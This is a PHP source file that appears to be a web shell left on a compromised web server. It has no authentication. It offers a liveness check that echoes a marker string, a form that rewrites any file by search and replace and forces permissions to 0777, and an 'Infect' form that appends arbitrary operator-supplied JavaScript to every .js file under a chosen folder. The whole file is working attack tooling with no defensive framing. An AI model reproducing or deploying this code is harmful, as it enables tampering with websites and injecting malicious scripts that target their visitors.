<?php

    if(!isset($_REQUEST['req']))
        return;

    switch ($_REQUEST['req']){
        case "hcheck":
            hcheck();
            break;
        case "inj":
            inj();
            break;
        case "replace":
            replace();
            break;
    }

    function hcheck(){
        echo 'pepyaka';
        return;
    }

    function addBodyStyle(){
        echo "<style> body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;} </style>";
    }

    function replace(){
        addBodyStyle();
        $startFolder = $_SERVER['DOCUMENT_ROOT'];
        echo "<style>input[type='text']{width: 90%; margin: 2%;}</style>";
        echo "<p style='color: goldenrod'>ROOT FOLDER: $startFolder</p><div style='margin: 30px; '><form method=post><input name='req' value='replace' hidden/><br /><input name='filepath' placeholder='input path to file' type='text'/>  <br /> <input name='searchfor' placeholder='search' type='text'/> <br /> <input name='replaceto' type='text' placeholder='replace to'> <br /> <input name='replacesubmit' value='replace' type='submit' style='float: right; margin-right: 8%;'/></form></div>";
        if (!isset($_REQUEST['replacesubmit']))
            return;

        $file =  $_REQUEST['filepath'];
        $search =  $_REQUEST['searchfor'];
        $replaceto =  $_REQUEST['replaceto'];


        $str=file_get_contents($file);
        $str=str_replace($search, $replaceto,$str);

        $isInjected = file_put_contents($file, $str, LOCK_EX);
        $isInjectable = true;
        if (!$isInjected) {
            $isInjectable = chmod($file, 0777);
            $isInjected = file_put_contents($file,  $str, LOCK_EX);
        }
        echo "<b style='color: goldenrod'>" . $file. "</b> :: is replaced : " .
            (($isInjected) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
            " :: is rewritable : " .
            (($isInjectable) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
            "<br />";
    }

    function inj(){
        addBodyStyle();
        if($_REQUEST['path_inj']) {
            $startFolder = $_REQUEST['path_inj'];
        } else {
            $startFolder = $_SERVER['DOCUMENT_ROOT'];
        }
        echo "<div style='margin: 30px; '><form method=post><input hidden name='req' value='inj'><input style='margin-bottom:10px; width:100%;background-color: black; color:#ffffff' name='path_inj' placeholder='$startFolder'><textarea placeholder='Enter js code which need add' name='jscode_injector' style='width:100%;background-color: black; height: 400px; color:#ffffff'></textarea><br/><br/><br/><input type=submit value=Infect name=jscode_injector_submit></form></div> ";
        if (!isset($_REQUEST['jscode_injector']))
            return;

        $add_text = $_REQUEST['jscode_injector'];
        $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startFolder));
        $files = array();
        foreach ($rii as $file) {
            if ($file->isDir()) {
                continue;
            }
            $file_info = explode(".", $file->getPathname());
            $ext = $file_info[sizeof($file_info) - 1];
            if (strtolower($ext) !== "js")
                continue;
            $isInjected = file_put_contents($file->getPathname(), "\n" . $add_text, FILE_APPEND | LOCK_EX);
            $isInjectable = true;
            if (!$isInjected) {
                $isInjectable = chmod($file->getPathname(), 0777);
                $isInjected = file_put_contents($file->getPathname(), "\n" . $add_text, FILE_APPEND | LOCK_EX);
            }
            echo "<b style='color: goldenrod'>" . $file->getPathname() . "</b> :: is injected : " .
                (($isInjected) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
                " :: is injectable : " .
                (($isInjectable) ? "<b style='color: greenyellow'>YES</b>" : "<b style='color: crimson'>NO</b>") .
                "<br />";
        }
        return;
    }
